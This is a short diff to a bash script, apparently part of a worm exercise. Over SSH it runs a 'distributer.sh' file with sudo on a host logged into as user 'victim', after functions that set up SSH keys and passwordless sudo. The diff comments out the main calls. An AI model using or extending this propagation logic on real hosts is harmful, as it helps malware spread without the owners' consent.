@@ -2,6 +2,7 @@
 
 destip=$1
 isFirst=$2
+echo $isFirst
 
 require_ssh_key_generated() {
     if [ ! -f ~/.ssh/id_rsa ]; then
@@ -38,11 +39,11 @@ require_worm_distributed() {
     ssh -i $pvkeyloc -t victim@$destip "chmod +x $tmpdest/distributer.sh && sudo $tmpdest/distributer.sh"
 }
 
-if [ -n $isFirst ]; then
-    echo "This is the first time ..."
-    reqruire_ssh_key_generated
-    require_nopasswd
-    require_ssh_key_set
-fi
-require_worm_distributed
-echo "All task done"
+#if [ -n $isFirst ]; then
+#    echo "This is the first time ..."
+#    reqruire_ssh_key_generated
+#    require_nopasswd
+#    require_ssh_key_set
+#fi
+#require_worm_distributed
+#echo "All task done"
